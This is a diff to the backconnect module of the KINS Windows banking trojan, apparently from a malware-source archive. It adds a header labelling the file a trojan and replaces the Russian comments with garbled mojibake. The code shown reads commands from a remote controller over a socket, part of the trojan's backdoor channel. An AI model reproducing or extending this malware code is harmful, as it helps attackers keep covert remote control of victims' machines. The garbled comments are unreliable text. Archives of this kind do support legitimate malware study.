@@ -1,3 +1,14 @@
+/*
+  name      KINS
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 
 #include "backconnect.h"
@@ -16,10 +27,10 @@ bool Backconnect::_readCommand(SOCKET s, COMMAND *command, LPBYTE *data)
 {
   WORD size[2];
   
-  //Получаем основные данные.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
   if(!WSocket::tcpRecvAll(s, size, sizeof(WORD) * 2, SOCKET_TIMEOUT) || size[0] <= sizeof(WORD) * 2)return false;
 
-  //Получаем следующие данные структуры.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   LPBYTE buffer = (LPBYTE)Mem::alloc(size[0]);
   if(buffer == NULL)
   {
@@ -33,14 +44,14 @@ bool Backconnect::_readCommand(SOCKET s, COMMAND *command, LPBYTE *data)
     return false;
   }
     
-  //Заполняем структуру.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   command->structSize = sizeof(COMMAND);
   command->dataSize   = size[1];
   command->command    = buffer[0];
     
   Mem::free(buffer);
 
-  //Получаем данные.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
   if(size[1] == 0)
   {
     if(data)*data = NULL;
